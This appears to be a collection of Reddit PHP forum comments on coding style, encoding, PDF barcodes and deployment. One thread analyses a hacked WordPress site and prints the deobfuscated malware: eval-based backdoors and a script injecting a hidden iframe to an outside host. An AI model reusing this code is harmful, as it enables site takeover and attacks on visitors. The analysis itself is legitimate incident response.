I use [codemirror](http://codemirror.net/) for my code pasting tool, and it works great. I couldn't imagine it being too difficult to implement in the system you have already? Even if you don't rely on it for syntax highlighting.
&gt; Click the speech bubble at the top to collapse them all I think you've got a usability issue there. &gt; or the red tab on the right to collapse a group. How about putting it where people expect to find it? People shouldn't have to spend time figuring out how to use a pastebin, and your current UI is unintuitive. Try being less clever, and more straight forward. The comment bubble looks like part of a logo or something, and like every UI on the planet, I'm looking for a little X on the window itself to close it. Not some tab off to the right. &gt; If a more popular pastebin were going to do this they would have already done it. Or it could be that no one is looking for a feature like this, so they're not going to waste time adding it. &gt; As it is chances are they will only do this after I have gained some market share if this idea takes off so I am not too concerned about it. It doesn't really work that way. The current popular pastebins have a ~1k Alexa rank. You're never going to get *close* to those numbers. Adding inline comments would only take them a few days to add, and then your site would be toast. Your site is a pastebin (And a poor one at that) with a neat little gimmick that can be easily copied. You should at least take everyone else's advice, and make it a better pastebin first.
No one is forcing you to use this man. I don't know why you are wasting your own time trying to argue with me. Let me know when you create a site by yourself with your own money and time and I will be happy to give you **constructive** feedback.
It is a code editor, I was just suggesting you use it at least for the initial code input, because it handles tabbing, syntax highlighting, etc.
Null checks *are* reusable, and the way he sets up his lazy loading takes far more effort and resources.
Why not simply pass the array by reference instead of a copy of it? It's both faster and easier to work with.
I should have clarified that it's never caused problems for *me*, even with a large amount of user-inputted data, so long as the input character set matched the output. I'm not sure why it is/was the default for the setup, but it seems to be a common thing.
They weren't really random, they're 2 common ones... I didn't know that ISO-8859-1 doesn't support that character, though. I included ISO-8859-1 as a fallback in case the first suggestion of UTF-8 didn't fix the display issue, hoping to get the issue squashed... I'm not an expert on character encoding stuff (obviously :p), but have run into it enough to have found those as possible solutions
Yep, it goes down to the field level: http://oregonstate.edu/cws/docs/collation latin1_swedish_ci seems to be the default in many setups, for whatever reason.. It appears that your data is stored in UTF-8, I guess, or something compatible, since setting that to the charset in the HTML worked... Maybe you could try switching the collation and see if it affects anything, but at any rate glad it is displaying properly!
PHP has dynamic dispatch and objects. This is what they're for. Instead of: switch($action){ case "Print": $do-&gt;Print($_POST);break; case "Users": $do-&gt;Users($_POST);break; ... } I just do this: $do-&gt;$action($_POST); Need a mapping? Fine. Save it in an array then: $mapped_action = $actions[ $input_action ]; $do-&gt;$mapped_action($_POST); This is far more straightforward and eliminates duplication. Less code also tends to mean less bugs. 
The use cases are rare, but there are use cases in some complex algorithms. I wish I could think of an example of when I actually needed one, but it was a long time ago. But there are times that absolutely impossible to do some algorithms without it.
Oh Ok thanks. I will look into it further and see what I might be able to reference. 
I agree with hiphop, it's a lot more pain than what it's actually worth. It's not 100% compatible with PHP, so you'll probably end up having to rewrite many core libs to even get it working correctly. I hope you have lots of unit tests! What i've found is lots of people playing with it, but very very very few people have decided to actually use it in production for quite a few reasons. It's pretty much only a magic bullet if you have loads of money to spend on QA and a programming team to review and rewrite your code base.
You can do that just fine with html (I know because I have done it). Just set the page size when you print it. It may require some experimentation to get the sizes right, but it can be done.
&gt; avoid the trap of premature optimization. My girlfriend complains about this all the time...
I thought about that and it would be really cool but with the libraries I am using it would be pretty difficult. Also as someone else pointed out there are often a mixture of languages making the detection even more difficult.
Stop using the pre processor and just wait to compiler.
Wow, talk about making the very simple extremely complex. An upvote for you sir.
I don't really know what you mean when you say null checks are reusable. But, disregarding that, the reason I wouldn't want to do it as you say above is because you're constructing a UserMapper inline. I happen to know that in the RJMetrics codebase, all of these mappers are constructed in one location and then injected via dependency injection (disclaimer: I used to work there). The Chart class should never know that a UserMapper is involved - only the ChartMapper should know that that's how users get loaded.
&gt; the first rule of optimization is "don't optimize unless you have to" God I hate that motto. If there *was* a definite performance difference between switch and a bunch of elseifs (there doesn't seem to be, judging by the contradictory replies, but that doesn't invalidate the question), the proper response would not be to write whatever strikes your fancy and then have to rewrite everything in a hurry when your server is out of CPU cycles; the proper response would be to take up the habit of using the one that's faster. Premature optimization is writing assembler code at a point where your algorithms aren't even finalized yet; knowing which constructs are more efficient than others is just good practice.
set your error_reporting to only E_ERROR AND E_PARSE... ignore all others especially E_WARNING AND E_NOTICE. Also practice byte code caching...
Pagination has been solved a million times. Re-use rather than rolling your own. CodeIgniter, for example, has a pagination class that I'm sure does everything you need: http://codeigniter.com/user_guide/libraries/pagination.html 
No, open sourcing was still a great idea. You don't close security holes by putting saran wrap over it and telling people it's safe, especially when there are a bunch of people standing next to you going "I can still see through that" while volunteering to fix it. I fucking DESPISE the idea of code obfuscation as a security measure. It is 100% never the right solution.
This is a demonstration of [variable methods](http://php.net/manual/en/functions.variable-functions.php).
Which is to say, don't use them.
I just did a replace of the eval in the encoded file with echo. Outputted all the source. trololol.
I never said it was the only use case, just a use case....
Or just use a damn switch statement.
I'm sorry, but this is just an anti-pattern. Referring to functions/methods by string is a horribly convoluted and error-prone way of doing things. It's *always* harder to read, makes refactoring heck of a lot more difficult and requires otherwise unnecessary sanity checking. If you want to use it, fine, but don't tell other people they should just because it's fancier or more "advanced usage".
Compiler? I hardly know her!
At what point did you guys notice you are geeks?
This is about the only use I ever have for references.
It's because when the function handles the string, it's assuming that each character is going to be a certain amount of bytes per character (since typically most characters are 1-byte each), however, [UTF-8 handles over a million possible combinations](https://en.wikipedia.org/wiki/UTF-8) which cannot be represented using only 1 byte, therefore each character could be represented using anywhere from 1 byte to up to 4 bytes. Whereas [latin1 only ever uses 1 byte](https://en.wikipedia.org/wiki/ISO/IEC_8859-1) to represent a single character (which has been the norm for quite a while). Also note: Every byte is made up of 8 bits (1's and 0's), so you can only have a grand total of 256 possible combinations of eight 0's and 1's (i.e. from 00000000 to 11111111). Take a look at the ASCII table for a list of the typical letters represented in this 0 to 255 format and you'll see how each character is represented by some number (decimal version, hexadecimal version and of course the binary/bit version): http://www.asciitable.com/ Therefore, when you take a UTF-8 only character that is, for example, using up 2 bytes to represent the 1 character and you're using latin1 to view/handle the character, you end up with 2 (or 3 or 4) characters in the latin1 character set that would have otherwise been the 1, correct character, representing that curly quote, ellipses, long dash (or whatever). Utilization of UTF-8 is a bit more recent, so older programs by default may be using an older single-byte character encoding. That's why you have to make sure to be more explicit about the fact that you're using UTF-8 **EDIT:** Corrected for accuracy and added more info on ASCII table.
I find that switch can sometimes be more readable because of fallthrough. Otherwise, I usually don't bother with using switch. 
Agree, this is essentially just having unnecessary function pointers. Cool code !== Good code You would be better off with http://php.net/manual/en/function.call-user-func.php if you really needed to do this.
The point is that readability is more important than saving a few processor cycles. Emphasis really is on "few". Other bottlenecks in the system, such as database transactions, cause slowdowns orders of magnitude higher than using switch versus if/else. So duh, write the code properly in the first place, but for the love of all that is good, don't use a ternary operator with closures to shave a few microseconds off of using if/else as a previous poster jokingly suggested. Programmers cost a whole lot more than than hardware.
Yeah, calling code based on user input really is asking for trouble.
Zend Framework's library has usable, not great but usable, classes for generating PDF's and Barcodes. In the application I work on we generate PDF's for address labels that include barcodes and are of a custom size. We even send it directly to CUPS print queues, bypassing the browser print step, by shelling out to LPR - as CUPS can print PDF's on its own.
Yes works fine - as mentioned the barcode class spits out as an image and you just instruct the PDF API to render it wherever you want it.
I *just* slogged through all this for a project that had to output shipping labels with barcodes to USPS specs. It's completely doable. Zend_Barcode has a PDF rendering component, which will render your barcode directly into a PDF doc (use Zend_Barcode_Renderer::setResource() (and note the second parameter if you have a multipage PDF) before calling draw()). The big snag I hit was that Zend's implementation makes it impossible (as far as my reading of the code showed me) to print certain Code128 characters like "FNC 1". I ended up having to extend Zend_Barcode_Object_Code128 and override a couple of methods to make that work. TCPDF may (or may not) be a better solution, depending on your needs. But Zend_Barcode+Zend_Pdf go a long way if you're not worrying about doing things like wrapping text (which is doable, but you'll have to roll your own implementation). 
wrong, "the one that's faster" is a statement that isn't even real, faster *where* exactly? faster *when* exactly? you can't answer those based on code alone. also when you hit or predict performance issues you profile and find the bottlenecks and optimize THOSE you don't have to change everything. as they say "cpu time is cheap but programmers aren't" and please don't confuse this with crappy code, we're talking about optimizations exclusively.
I don't disagree on this however, my point is that "you need to know first whether it's just a few cycles or it's a signficant difference" only matters after you've hit a performance problem. in your loop example, it doesn't matter if the former is 500 times faster than the latter if the actual difference is a few miliseconds that you don't care about. it's good to know tricks such as this but readability and clarity win over performance all the time, it's only after it becomes a problem and only where it is actually a problem when you should apply those tricks.
not any more than if () { } elseif () { } else { } 
Ah, that makes two of us!
Actually, phunction is only PHP 5.1+ I believe. I've been on Alix for a while now about not using comments in his code. However, there is a wiki on github that has a couple example pages like routing and such. Most of that stuff really does seem like magic - when I saw your snippet I thought of him. If there is an alternative way to do something in PHP - he probably did it, did it right, and did it in 20x less code. Oh, and I added [multiple parent inheritance](https://gist.github.com/2026285#file_class.v2.php) (using array casting) and exception handling to your views.
Thanks guys, this has given me some ideas on how to proceed. Much appreciated.
as far as performance, there's likely a tiny difference that wouldn't make much of a problem one way or the other, but there are other subtle differnces that would make one more useful than the other depending on the situation: For instance: * you can perform calculations in the conditionals if/else conditions, you cannot in switch values. * A switch takes a value and compares it to a set of case values. Those that are equal are executed. If else statements only allow a SINGLE block of code to execute. This allows for "fallthrough" if you leave out a break in a code block in a switch statement, as well as stacking cases on top of the same block of code without having to duplicate that code across multiple if/elseif/else blocks. I find myself using switches a lot in JAVASCRIPT when I return op codes from PHP ajax functions, but I've found uses for them in PHP too when simple if/elseif/else won't cut it as finely. 
This is what I ended doing, which is pretty much a hack but it works. tweak the tcpdf.php to add my custom size in getPageSizeFromFormat function. Then did the following in test.php require_once('../config/lang/eng.php'); require_once('../tcpdf.php'); // create new PDF document $pdf = new TCPDF(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, true, 'UTF-8', false); // set document information $pdf-&gt;SetCreator(PDF_CREATOR); $pdf-&gt;SetAuthor('Nicola Asuni'); $pdf-&gt;SetTitle('TCPDF Example 028'); $pdf-&gt;SetSubject('TCPDF Tutorial'); $pdf-&gt;SetKeywords('TCPDF, PDF, example, test, guide'); // remove default header/footer $pdf-&gt;setPrintHeader(false); $pdf-&gt;setPrintFooter(false); // set default monospaced font $pdf-&gt;SetDefaultMonospacedFont(PDF_FONT_MONOSPACED); //set margins $pdf-&gt;SetMargins(0, 0, 0); //set auto page breaks $pdf-&gt;SetAutoPageBreak(TRUE, 0); //set image scale factor $pdf-&gt;setImageScale(PDF_IMAGE_SCALE_RATIO); //set some language-dependent strings $pdf-&gt;setLanguageArray($l); //set style of barcode $style = array( 'position' =&gt; '', 'align' =&gt; 'C', 'stretch' =&gt; true, 'fitwidth' =&gt; true, 'cellfitalign' =&gt; '', 'border' =&gt; false, 'hpadding' =&gt; 'auto', 'vpadding' =&gt; 'auto', 'fgcolor' =&gt; array(0,0,0), 'bgcolor' =&gt; false, //array(255,255,255), 'text' =&gt; true, 'font' =&gt; 'helvetica', 'fontsize' =&gt; 8, 'stretchtext' =&gt; 4 ); $pdf-&gt;SetDisplayMode('fullpage', 'SinglePage', 'UseNone'); // set font $pdf-&gt;SetFont('times', 'B', 6); //add test data to page $pdf-&gt;AddPage('L', 'L88'); $pdf-&gt;SetY(2); $pdf-&gt;Cell(0, 0, 'test', 0, 0, 'C'); $pdf-&gt;SetY(5); $pdf-&gt;SetX(5); $pdf-&gt;write1DBarcode('123456*789012', 'C93', '', '', 40, 12, 0.4, $style, 'N'); $pdf-&gt;SetY(15); $pdf-&gt;Cell(0, 0, '4 XXL Purple 12', 0, 0, 'C'); $pdf-&gt;Cell(0, 0, 'Oprtn ', 0, 0, 'R'); $pdf-&gt;SetY(18); $pdf-&gt;Cell(0, 0, 'Screen print', 0, 0, 'C'); $pdf-&gt;AddPage('L', 'L88'); $pdf-&gt;SetY(2); $pdf-&gt;Cell(0, 0, 'test', 0, 0, 'C'); $pdf-&gt;SetY(5); $pdf-&gt;SetX(5); $pdf-&gt;write1DBarcode('123456*789012', 'C93', '', '', 40, 14, 0.4, $style, 'N'); $pdf-&gt;SetY(18); $pdf-&gt;Cell(0, 0, '4 XXL Purple 12', 0, 0, 'C'); $pdf-&gt;Cell(0, 0, 'Oprtn ', 0, 0, 'R'); $pdf-&gt;SetY(20); $pdf-&gt;Cell(0, 0, 'Screen print', 0, 0, 'C'); $pdf-&gt;lastPage(); //Close and output PDF document $pdf-&gt;Output('barcode_test.pdf', 'I'); Hope it helps anyone who is looking to do something similar. 
It's also useful in tree structures where an encapsulated child needs a way to refer to its parent. I'm sure there are other cases as well.
&gt;Now, references aren't terribly useful Wrong. There are cases where a reference is a good way to get things done. Also, in case we've forgotten, a passed object is *always* a reference unless you specifically clone it. It's not that references have no use, it's that people need to learn when they're appropriate.
&gt;if/elseif is up to 25% faster Even if it were true, you **need** to take everything into consideration. If shit is cached, then it barely matters at all, and even if it's not it will likely barely matter at all because other things like file io are orders of magnitude slower anyway. I think switches can be way more readable in some cases (would equate to lots of || in if/else), and maintainability is far far more important than these micro optimisations.
Incredibly terrible reasons to do server side obfuscation. Just... no. There may be use cases, but hiding from AV is NOT one of them that should be legitimately explored.
Show me where they work better than proper object-oriented design and I might be able to agree with you.
I'm sure you already know, but incase you don't, take a look at the comically named [wp_nonce_field() function](http://codex.wordpress.org/Function_Reference/wp_nonce_field)
Not necessarily. The client *can* interpret it. You can also do it server side. That's the thing about being a standard: people tend to implement you.
I'm using if/elseif/else most of the time and not because of the performace. The comparision of if/elseif/else is more flexible and supports strict comparision (switch - traditionally used - supports only equals and loose comparision). But there is some fancy things you can do with switch statement that can be of use. As for example this syntax is valid: $x = -1; switch (true) { case ($x &lt; 0): { echo("triggers if $x &lt; 0 / "); } case ($x == 0): { echo("triggers if $x &lt;= 0 / "); } case ($x &gt; 0): { echo("triggers always / "); } }
all these are fine as long as you need them, notice there's a tradeoff in each situation since cache consumes memory or disk, an index uses more space and slows down writes and so on. the problem here is not the optimization but the generalization, I don't think there's a single case where people can blindly "employ what they learned from there in future projects" since different projects have different requirements and most importantly, in the case of language constructs (as in OP) you can't even assume that what was better at version 1.2.x will remain the same at version 1.3.y
That is terrible advice. There is no benefit to ignoring warnings whatsoever. 
You've got $SERVER where you probably mean $_SERVER. And you really really should not be using Font tags to highlight the color of the errors, that tag's been deprecated since HTML 4! Also, the suggestion to use variable variables for this sort of work where even a simple array would suffice is a *terrible* idea for beginners. Which you should already know, since [we tore apart that article](http://www.reddit.com/r/PHP/comments/qpgpf/variable_variables_in_php/?already_submitted=true) when you posted it last week.
what in fucks name has error reporting got to do with choosing a programming construct?
I didn't say anything about "fancier" or "advanced usage". I said it was shorter, and had fewer bugs. Maintaining duplicate code and logic- perhaps across several files- is far more error prone than a lookup table. I can't imagine what kind of person would think otherwise. Refactoring is also easier because there are less things to change. Finally: It also requires *fewer* "sanity checks" because if you forget your `default:` block you might have introduced a bug, but you can't forget to handle all of the dispatches. 
What exactly do you think `if` does?
That *really* makes no sense. References and proper object-oriented design are not mutually exclusive.
You're wrong. **It's the exact same logic.** The problem is that if you had any taste at all, you wouldn't have started with that; you wouldn't be naming your "Get" methods "Put", so you wouldn't be needing to rewrite them. It should have been: $object-&gt;$method(); And if for some reason you need to rename all of your methods later, then you can look at your options: Is this just user-interface? Or is GetUncheckedUser really GetUncheckedUserGroup? Maybe subclassing is the answer. Maybe you want to store this logic in a database. If it turns out you need the switch, then fine, add it when you need it. But don't start all of your code as a steaming hot pile of shit just because you might one day need it to become a steaming hot pile of shit.
* Most exploits of this type probably aren't going to bother with backdoor scripts - it's just typical spam filler. * Personally, for a site that simple, I'd wipe everything clean code-wise and load a recent backup. Then upgrade Wordpress to the latest version. And finally, check for obvious submission-exploits and file permission issues. * The header just creates a form that keeps track of a passed variable when the page is posted to. The cookie bit makes me thing that something else is probably going on on that page. * The footer just has a bunch of comments in in and is repeatedly base64 encoded, it translates to this: if(isset($_REQUEST['asc']))eval(stripslashes($_REQUEST['asc'])); (So, basically, "do whatever is passed to the page" which is crazy-dangerous to have in there.) * If it's a blank page on a free site, someone probably found the exploit elsewhere and reported it. That's relatively good news, but you're still not safe.
The blank page on the free hosting site likely used to contain exploit code (To take over the machine/browser of people browsing your site), but was taken down by the free hosting service. It also likely was not a targeted attack, and instead crawls for sites running services which are vulnerable to their attack (likely wordpress).
Worth noting, although uncommon, the attack may be deeper than just PHP injection in public facing files. They could have easily created a perl script to run on your server for example which could lead to a world of hurt Check your http request logs to see traces of the attack and grasp what has happened 
Umm... that multiple view thing is interesting. What is the use case for it? I mean what's the advantages of using just includes in the normal view or adding subviews? Sub views example: &lt;?php $view = new view('main.php'); $view-&gt;sub = new view('sub.php'); $view-&gt;aside = new view('aside.php'); And main.php: &lt;?php $layout = 'layout.php'; ?&gt; &lt;div class="main"&gt; This is main &lt;/div&gt; &lt;div class="sub"&gt;&lt;?= $sub ?&gt;&lt;/div&gt; &lt;aside&gt;&lt;?= $aside ?&gt;&lt;/aside&gt; &lt;div class="sub-include"&gt;&lt;?php include 'sub-include.php'; ?&gt;&lt;/div&gt; &lt;div class="partial-include&gt;&lt;?= partial('partial-include.php') ?&gt;&lt;/div&gt; So what's the use case for multiple views? I might add that exception handler in place. But then there is also the errors. Instead of casting the exception as string, would it be better to call `$e-&gt;getMessage();` ? Or if you meant multiple layouts, then this already works with my code too: index.php: &lt;?php die(new view('view.php')); view.php: &lt;?php $layout = 'section.php'; ?&gt; &lt;p&gt;This is a View!&lt;/p&gt; section.php: &lt;?php $layout = 'master.php'; ?&gt; &lt;h1&gt;This is a Section!&lt;/h1&gt; &lt;?= $view ?&gt; master.php: &lt;html&gt; &lt;head&gt; &lt;title&gt;This is a Master!&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?= $view ?&gt; &lt;/body&gt; &lt;/html&gt; Or did I miss something? You can continue addind &lt;?php $layout = 'xxx.php' ?&gt; forever. Infact you can easily make it loop forever: view.php: &lt;?php $layout = 'view.php'; ?&gt; Causes it to loop forever. Thanks for the info about the wiki. I will look at it.
It's obfuscated to hell with multiple nested evals but here's basically what the code looks like (I've omitted some needless stuff for brevity and clarity): I'll follow up with a reply header.php: ----- if (!empty($_COOKIE['v']) and $_COOKIE['v']=='d'){ if (!empty($_POST['c'])) { echo '&lt;textarea rows=28 cols=80&gt;'; $d=base64_decode(str_replace(' ','+',$_POST['c'])); if($d) eval($d); echo '&lt;/textarea&gt;'; } echo '&lt;form action="" method=post&gt; &lt;textarea cols=80 rows=28 name=c&gt;&lt;/textarea&gt;&lt;br&gt; &lt;input type=submit&gt; &lt;/form&gt;';exit; } footer.php: ----- eval(stripslashes($_REQUEST['c'])); index.php ----- error_reporting(0); $bot = FALSE ; $ua = $_SERVER['HTTP_USER_AGENT']; $botsUA = array('12345','alexa.com','anonymouse.org','bdbrandprotect.com','blogpulse.com','bot', 'crawl','docomo','drupal.org','feedtools','htmldoc','httpclient','internetseer.com','linux','macintosh', 'mac os','magent','mail.ru','mybloglog api','netcraft','openacoon.de','opera mini', 'opera mobi','playstation','postrank.com','psp','rrrrrrrrr','rssreader','slurp','snoopy','spider','spyder', 'szn-image-resizer','validator','virus','vlc media player','webcollage','wordpress','x11','yandex', 'iphone','android'); foreach ($botsUA as $bs) {if(strpos(strtolower($ua), $bs)!== false){$bot = true; break;}} if (!$bot){ echo "&lt;script&gt; if(document.getElementsByTagName('body')[0]){ iframer(); } else { document.write(\"&lt;iframe src='http://rila1621.serverftp.com/?go=2' style='visibility:hidden'&gt;&lt;/iframe&gt;\";) } function iframer(){ var f = document.createElement('iframe'); f.setAttribute('src', 'http://rila1621.serverftp.com/?go=2'); f.style.visibility='hidden'; document.getElementsByTagName('body')[0].appendChild(f); } &lt;/script&gt;"; } Your last pastebin I couldn't even load because my AV caught it and flagged it as "JS/IFrame.CD trojan" 
Totally agreed, but if they're just hacking in base64 encoded stuff into wordpress, it's doubtful they bothered with fancy perl. ;)
How are you trying to run it? What error message do you get, if any? One thing to note is that if you're running the script via PHP called from your web server, make sure your web server's user has proper permissions to access the .sh file you're trying to run. And also, due to Apache (or whatever server you use) using a different user account than your own, if your shell script tries to do anything with SSH, it will probably fail as it's not using your own SSH key files.
fyi. the iframe url is DNS not resolved.
It's still an incorrect sweeping generalisation.
the part where I am reply to &gt;avoid the trap of premature optimization. - My girlfriend complains about this all the time... read the previous comment to understand that it is part of that joke!!!!... man, reddit is having a hard time getting a joke???
A lot of parallel problems can be done with a queue setup using tools like Gearman. Especially if something is going to take long enough to slow the response, like resizing/encoding images and video, transfers to S3, etc.
the part of the joke to the previous comment!
You can also write your own auto loader that figures out the path using any method you like.
Yeah, the variable's got to be in the file referenced in the notice, I assume you've done a search for it? One thing you can try is, at the top of the script: $rt = !empty($rt) ? $rt : null;
Suffix the commandline with this &amp;&gt;&gt;hamtaformular.log See what it says.
This is a really nice overview of the MySQL ecosystem. Hadn't kept up on Drizzle or MariaDB in a while, and learned some new stuff about Percona too. Thanks!
What I'd also like to know us how well supported these are in PHP? Since Drizzle breaks compat with MySQL, I suppose it'll need a separate driver... Are the other two solid with the MySQL PDO lib?
by using `if` you will be whitelisting actions. by calling the value of $action directly, the user may call anything they wish on the object by arbitrarily changing the input. of course, it depends on the implementation as to whether that becomes a serious issue or not but all in all it's something to avoid.
Parallelism seems to be a trend these days and I see people complicating things a lot with parallelism. Taking your example you probably solve it the most efficient way possible, running the operations on multiple treads or processes in parallel will only slow it down because the disk is the bottleneck there, all threads or processes will try to read simultaneous from the disk causing more seeks. What I said before applies to a lot of problems, you have to analyze the problem very carefully and decide if you will gain by running in parallel. Edit: Producer consumer pattern is efficient only when you are dealing with two different bottlenecks when producing and consuming(for example reading from one disk and writing to another), if you are dealing with the same bottleneck it will only make things worse(for example reading from one disk and writing to the same disk).
That's actually true, but I like to stick to the standard to make my code a little more "Universal". Thanks for the reply!
Interesting. I can see this being useful in a handful of scenarios, but its not a replacement for traditional database driven authentication in web-based environments. 
Awesome, thanks for the info!
There are cases where one developer / company is giving someone a script or scripts that are licensed for an individual usage and you don't want them to be able to simply edit out the license checks or copy the script and use it on other sites etc. However in those cases, I'd definitely use ioncube over this.
This problem isn't one to solve by running it in parallel. You're going to be limited by the hard drive's random disk access speed; not the speed of PHP. Running it in parallel will only slow down your throughput.
PHP is not multithreaded, and has no parallel libraries. (Multithreaded and parallel processing are different things.) There is no concept of scatter and gather, and most importantly, there is no assigning processes to specific cores. There is no communication between the processes. Forking processes to run simultaneously to run in "parallel" is all handled by the OS, so it's not really parallel programming. There are languages better suited for parallel programming.
In this case an antivirus won't help you, although it's good to install one. ClamAV is pretty good and R-fx Networks' linux malware detect (LMD) is also good. Also, for your exploit use this nifty PHP script which scans your files for the most common exploits: http://www.php-beginners.com/solve-wordpress-malware-script-attack-fix.html
i/o is not the bottleneck. I cooked up a quick shell script using GNU parallel (which actually uses the psql commandline so it opens and closes a database connection for every insert) and there was a nontrivial increase in performance.
Glad you solve it:) Related to parallelism improving this i/o is probably still the bottleneck just that because i/o is such a huge bottleneck to everything everybody tries to optimize(os caches files, mysql caches tables ...). Testing a non parallel script then testing a parallel script will mess with the result since running the non parallel first will cache a lot of data :) 
I don't think that this reddit is the right target group for this. I think it is mainly used by people who already know PHP and not those you are just starting to learn the very basics. Btw, not everything that has parenthesis is a function. E.g. empty() and isset() are not. They are language constructs.
Exceptions cannot be handled in PHP inside a __toString() method which means we need to catch them manually, errors are fine as-is. Casting the exception to a string is shorter and will contain the stack-trace in addition to the actual exception message. I guess you could show `$e-&gt;getMessage()` for production and `(string) $e` for development. The multiple inheritance probably could be handled with includes. The idea is just to bring in extra widgets when they are needed. post.php: &lt;?php $layout = array('sidebar1.php', 'master.php'); ?&gt; &lt;p&gt;This is a post using sidebar1!&lt;/p&gt; page.php: &lt;?php $layout = array('sidebar2.php', 'master.php'); ?&gt; &lt;p&gt;This is a page using sidebar2!&lt;/p&gt; sidebar1.php: &lt;?php block($sidebar); ?&gt; &lt;div id="sidebar1"&gt; Sidebar one &lt;/div&gt; &lt;?php block(); ?&gt; sidebar2.php: &lt;?php block($sidebar); ?&gt; &lt;div id="sidebar2"&gt; Sidebar Two &lt;/div&gt; &lt;?php block(); ?&gt; master.php: &lt;html&gt; &lt;head&gt; &lt;title&gt;This is a Master!&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?= $view ?&gt; &lt;?php if(isset($sidebar)) print $sidebar; ?&gt; &lt;/body&gt; &lt;/html&gt; I suppose this is overkill since you could just `require()` them and get access to the same block. Perhaps with a little more design thought I can make them useful.
Cool - very basic overview. I use "optional parameters" all the time in my applications, but didn't know they were called that. 
Out of curiosity, what is the difference between a function and a language construct? 
He died from the refrain of switch statements.
&gt;The advantage of having functions in you PHP scripts are that you can reuse code as much as it is needed. Oh rly? 
From what I've seen, there are only three methods (or areas) where PHP can even begin to enter the parallel world. PostgreSQL queries, cURL requests, and straight forks of the current thread. - [pg_send_query()](http://us2.php.net/manual/en/function.pg-send-query.php) - [curl_multi_exec()](http://php.net/manual/en/function.curl-multi-exec.php) - [pcntl_fork()](http://php.net/manual/en/function.pcntl-fork.php) It's better to handle processes that need parallelism in a language like Javascript on Node.js.
If you're absolutely dead set on this... since it's using sudo why not just use passwd and save all the added complexity? But don't do this.
NO!
Great, Apache with sudo rights!
This is a terrible, terrible, terrible idea for several reasons. 1: apache should not have direct or sudo access to anything that isn't tightly wrapped up 2: you should *never* be manipulating the password file directly; what if this code is copied to a FreeBSD system? What if the system passwords are encrypted via a different method than this? For those new to PHP that want to do this, don't. There's a better way: You create a second script/program in whichever language you want that uses the system user manipulation programs (like passwd/usermod) to do what you need based on the CLI input, and you give apache sudo access to *only* that script.
I never understood what's wrong with "apt-get install php5-apc"...
Fun fact: excel can open HTML files - the whole sheet needs to be just a table and you're done. Will not work wifh openoffice though.
It's perfectly fine, so long as you're on a Debian-based distro. It'd be something else with a RPM-based distro though, and yet another thing with one of the BSDs. As a general rule, building from source should be a last resort though.
Strict licensing agreements are the only solution, if you must give the code to the customer to run themselves. Even with the most advanced DRM systems, they're inevitably broken within a couple of weeks.
If you personally go the PDO route, I have no reason to believe you're doing wrong. You should be fine, and you seem to be doing fine. I think the most important thing is moving away from the old mysql extension, as you are doing. All I was saying is that it might be easier for other old mysql extension users to move to mysql_i_ first as that offers the basic procedural option mimicking the old way, and then move into OO and from there PDO. But the direction to move to all depends on a developer's preference and comfort zone.
my benchmark used: dd bs=1M count=2 if=/dev/urandom of=/tmp/shabench/{$t}/{$i} to generate random files for each script to use. it would then call another script with sudo that looked like this: sync echo 2 &gt; /proc/sys/vm/drop_caches echo 0 &gt; /proc/sys/vm/drop_caches **i/o was not the bottleneck here**
...whose name is Bird Oiseaux.
That is interesting. What kind of storage do you use? Php sha1 should be able to process 1M of data in about 5 milliseconds on consumer hardware and in order to get better results using parallelism you should be able to read over 200MB/sec constantly from the disk.
You should try my autoloader: http://www.phpu.cc/releases/thrive-latest.zip
Excellent write up, I look forward to more in this series. Gives me a real reason to dive right into PHP's source code and better understand how certain things work. I would hope that there will be GC overviews at some point to dispell the rumours about how it operates - although now you can manually call the GC as of 5.4.
I dunno, the stereotypical php.net comments push it over the top for me.
Whaaaaat? Ok first of all you should never be deploying a webapp to www/ directly (or whatever your web root is). You should empty that shit, make a new directory somewhere accessible from phing, and then symlink your new folder (most people do a combo of naming convention and date/time for combined readability and guaranteed uniqueness). Now you can delete whatever the hell you want after guaranteeing your deploy went ok. 
[You think that's good?](http://linux.about.com/library/cmd/blcmdl1_false.htm) =D
Absolutely this. I know this is the PHP community, but personally I use [Capistrano](https://github.com/capistrano/capistrano/wiki/Documentation-v2.x) for web deployment - it makes these sorts of things ridiculously easy. Tie it with a framework with db migrations (e.g. Symfony + Doctrine), and no more worrying about things breaking when updating your site!
Okay that makes sense. So the server could be set up as follows /var/www/html/projectname &lt;-- web root for the project, a symlink to something like... /some/random/build/dir/projectname/20-08-12 When phing completes its tests it just switches out the projectname symlink to point to the new build directory. Sounds like this would work perfectly.
like capifony!
I think this is why php is fantastic. I'm a fan of the back tick operator myself, but I would feel relieved and grateful to find this man page if I were still a newb.
Submit to codetique.com. 
https://bugs.php.net/bug.php?id=52435
I can't decide if that's a troll or not. Either way, a thing of beauty! Thanks for the link!
Absolutely amazing.
Will do, thanks! 
Reading up on how to do unit tests atm!
So you were one of "those people" ? :)
Yes. Its on the plan.
Undefined offset is a warning that lets you know you're using an array that hasn't been declared before. Without a line number to go on here, I'm guessing $matches?
Looking over the search function, I'm very confused as to why you return 'accessStatement' which as per your example would require you to do this: $results = $crxml-&gt;search('Timestamp'); $value = $crxml-&gt;{$results[0]['accessStatement']}; Rather than simply allowing: $value = $crxml-&gt;search('Timestamp')[0]['value']; In its current setup, I'd probably be more inclined to simply strip the node tags out of the 'nodeContent' value. Also what's the point of returning nodeName in the array when that's always going to be a known value (if you're searching it)? Is this perhaps a default set of outputs for other functions also?
The first thing that jumped out at me is that you've got some really ugly sprintf() constructs where simple string concatenation will do: &gt; static::$queries[] = sprintf('Query "%s" returned %s row(s)', $statement, $sth-&gt;rowCount()); (Also, sticking all your queries into a static variable is absolutely going to eat memory, you should farm those out to a logging class and forget about them immediately.) &gt; * @param array $bindings Your documentation needs a lot of work. It's inconsistent, and doesn't actually explain what your functions do or expect. Here's your biggest problem though: &gt;This made me feel like they all had something I liked but those things were still scattered amongst the frameworks and I decided that I should create my own [Hubris](http://en.wikipedia.org/wiki/Not_invented_here) is the sign of a bad programmer. Your time is far better spent learning the intimate details of a popular framework than writing a new one from scratch that you will inevitably throw away when you mature enough to realize that it's crap. ;)
Looks like cargo culting to me.
unfortunately this is one of the only parts of code i copied froma tutorial. I hugely regret this now but re-doing this part of the theme is out of the question. so unfortunately i have no idea what purpose ob_start(); and ob_end_clean(); have...
